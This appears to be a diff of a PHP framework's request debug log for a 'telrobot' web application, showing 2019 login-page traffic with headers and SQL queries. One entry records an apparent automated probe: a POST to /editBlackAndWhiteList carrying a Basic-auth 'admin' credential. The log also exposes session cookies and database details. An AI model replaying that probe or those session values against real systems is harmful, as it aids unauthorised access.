+[ log ] ###user_id=time=2019-10-12 11:22:01function=user/index/login
+---------------------------------------------------------------
+[ 2019-10-12T11:22:02+08:00 ] 172.16.170.169 183.253.48.152 GET /user/index/verify
+[ info ] s-6-2111.pssdss.com/user/index/verify [运行时间：0.041168s][吞吐率：24.29req/s] [内存消耗：3,950.45kb] [文件加载：55]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'verify',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 's-6-2111.pssdss.com',
+  'connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'referer' => 'http://s-6-2111.pssdss.com/user/index/login',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'cookie' => 'UM_distinctid=16bbad4500f52b-099d6fae8cae9-3c604504-100200-16bbad45010583; PHPSESSID=sb18enngn6in9tm2bnvfpfvv54; __guid=153879994.4210836772417975300.1570850851645.9673; monitor_count=1',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\common\controller\Base->verify[ /www/wwwroot/web/application/common/controller/Base.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000365s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000786s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000225s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000807s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000194s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000557s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000144s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000719s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000172s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000514s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000159s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000596s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000173s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000173s ]
+[ log ] ###user_id=time=2019-10-12 11:22:02function=user/index/verify
+---------------------------------------------------------------
+[ 2019-10-12T11:22:02+08:00 ] 172.16.170.169 183.253.48.152 GET /favicon.ico
+[ info ] s-6-2111.pssdss.com/favicon.ico [运行时间：0.021713s][吞吐率：46.06req/s] [内存消耗：1,659.80kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 's-6-2111.pssdss.com',
+  'connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'referer' => 'http://s-6-2111.pssdss.com/user/index/login',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'cookie' => 'UM_distinctid=16bbad4500f52b-099d6fae8cae9-3c604504-100200-16bbad45010583; PHPSESSID=sb18enngn6in9tm2bnvfpfvv54; __guid=153879994.4210836772417975300.1570850851645.9673; monitor_count=1',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-10-12T11:30:18+08:00 ] 172.16.170.169 84.236.44.10 POST /editBlackAndWhiteList
+[ info ] 47.96.126.228/editBlackAndWhiteList [运行时间：0.013393s][吞吐率：74.66req/s] [内存消耗：1,660.48kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'editBlackAndWhiteList',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'content-length' => '586',
+  'accept-language' => 'en-us',
+  'host' => '47.96.126.228',
+  'accept' => '*/*',
+  'user-agent' => 'ApiTool',
+  'connection' => 'close',
+  'cache-control' => 'max-age=0',
+  'content-type' => 'text/xml',
+  'authorization' => 'Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0=',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-10-12T12:42:24+08:00 ] 172.16.170.169 39.107.116.226 GET /
+[ info ] s-6-2111.pssdss.com/ [运行时间：0.030579s][吞吐率：32.70req/s] [内存消耗：3,922.85kb] [文件加载：57]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'host' => 's-6-2111.pssdss.com',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000360s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000733s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000178s ]
+---------------------------------------------------------------
+[ 2019-10-12T12:42:24+08:00 ] 172.16.170.169 39.107.116.226 GET /user/index/login
+[ info ] s-6-2111.pssdss.com/user/index/login [运行时间：0.045733s][吞吐率：21.87req/s] [内存消耗：3,960.72kb] [文件加载：56]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'host' => 's-6-2111.pssdss.com',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\Index->login[ /www/wwwroot/web/application/user/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/index/login.html [ array (
+  0 => 'request',
+  1 => 'param',
+  2 => 'userAgentType',
+  3 => 'is_super',
+  4 => 'allcinfig',
+  5 => 'msgNum',
+  6 => '__menu__',
+  7 => 'meta_title',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000423s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000993s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000239s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000771s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000172s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000523s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000168s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000487s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000187s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000423s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000139s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000407s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000167s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000148s ]
+[ log ] ###user_id=time=2019-10-12 12:42:24function=user/index/login
+---------------------------------------------------------------
+[ 2019-10-12T12:42:27+08:00 ] 172.16.170.169 39.107.116.226 GET /user/index/verify
+[ info ] s-6-2111.pssdss.com/user/index/verify [运行时间：0.039352s][吞吐率：25.41req/s] [内存消耗：3,948.54kb] [文件加载：55]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'verify',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'host' => 's-6-2111.pssdss.com',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\common\controller\Base->verify[ /www/wwwroot/web/application/common/controller/Base.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000344s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000766s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000191s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000714s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000153s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000498s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000116s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000522s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000171s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000435s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000160s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000432s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000141s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000154s ]
+[ log ] ###user_id=time=2019-10-12 12:42:27function=user/index/verify
+---------------------------------------------------------------
+[ 2019-10-12T13:08:47+08:00 ] 172.16.170.169 103.113.0.170 GET /
+[ info ] 47.96.126.228:80/ [运行时间：0.044359s][吞吐率：22.54req/s] [内存消耗：3,923.06kb] [文件加载：57]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '47.96.126.228:80',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
+  'content-length' => '0',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000455s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000966s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000246s ]
+---------------------------------------------------------------
+[ 2019-10-12T13:41:30+08:00 ] 172.16.170.169 84.107.84.197 GET /
+[ info ] 47.96.126.228/ [运行时间：0.030542s][吞吐率：32.74req/s] [内存消耗：3,922.72kb] [文件加载：57]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'host' => '47.96.126.228',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000355s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000705s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000201s ]
+---------------------------------------------------------------
+[ 2019-10-12T14:47:43+08:00 ] 172.16.170.169 47.98.102.111 GET /
+[ info ] 47.96.126.228/ [运行时间：0.032350s][吞吐率：30.91req/s] [内存消耗：3,923.34kb] [文件加载：57]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'host' => '47.96.126.228',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000513s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000725s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000193s ]
+---------------------------------------------------------------
+[ 2019-10-12T14:47:43+08:00 ] 172.16.170.169 47.98.102.111 GET /user/index/login
+[ info ] 47.96.126.228/user/index/login [运行时间：0.037695s][吞吐率：26.53req/s] [内存消耗：3,960.80kb] [文件加载：56]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'host' => '47.96.126.228',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\Index->login[ /www/wwwroot/web/application/user/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/index/login.html [ array (
+  0 => 'request',
+  1 => 'param',
+  2 => 'userAgentType',
+  3 => 'is_super',
+  4 => 'allcinfig',
+  5 => 'msgNum',
+  6 => '__menu__',
+  7 => 'meta_title',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000332s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000664s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000184s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000691s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000168s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000491s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000139s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000615s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000175s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000489s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://47.96.126.228' LIMIT 1 [ RunTime:0.000154s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000425s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000175s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000151s ]
+[ log ] ###user_id=time=2019-10-12 14:47:43function=user/index/login
+---------------------------------------------------------------
+[ 2019-10-12T14:47:46+08:00 ] 172.16.170.169 47.98.102.111 GET /user/index/verify
+[ info ] 47.96.126.228/user/index/verify [运行时间：0.040406s][吞吐率：24.75req/s] [内存消耗：3,948.63kb] [文件加载：55]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'verify',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'host' => '47.96.126.228',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\common\controller\Base->verify[ /www/wwwroot/web/application/common/controller/Base.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000348s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000865s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000224s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000630s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000144s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000484s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000143s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000554s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000144s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000457s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://47.96.126.228' LIMIT 1 [ RunTime:0.000131s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000441s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000142s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000183s ]
+[ log ] ###user_id=time=2019-10-12 14:47:46function=user/index/verify
+---------------------------------------------------------------
+[ 2019-10-12T15:37:49+08:00 ] 172.16.170.169 60.173.242.198 GET /
+[ info ] s-6-2111.pssdss.com/ [运行时间：0.031341s][吞吐率：31.91req/s] [内存消耗：3,924.32kb] [文件加载：57]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 's-6-2111.pssdss.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
+  'cookie' => 'UM_distinctid=16dbed34a2f127-0b1b5b8cd60abe-67e1b3f-1fa400-16dbed34a308ef',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000316s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000693s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000183s ]
+---------------------------------------------------------------
+[ 2019-10-12T15:37:49+08:00 ] 172.16.170.169 60.173.242.198 GET /user/index/login
+[ info ] s-6-2111.pssdss.com/user/index/login [运行时间：0.038416s][吞吐率：26.03req/s] [内存消耗：3,962.52kb] [文件加载：56]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 's-6-2111.pssdss.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
+  'cookie' => 'UM_distinctid=16dbed34a2f127-0b1b5b8cd60abe-67e1b3f-1fa400-16dbed34a308ef; PHPSESSID=ftvehtui4kco1mtm6id5b108t4',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\Index->login[ /www/wwwroot/web/application/user/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/index/login.html [ array (
+  0 => 'request',
+  1 => 'param',
+  2 => 'userAgentType',
+  3 => 'is_super',
+  4 => 'allcinfig',
+  5 => 'msgNum',
+  6 => '__menu__',
+  7 => 'meta_title',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000342s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000685s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000171s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000707s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000207s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000482s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000158s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000637s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000149s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000473s ]
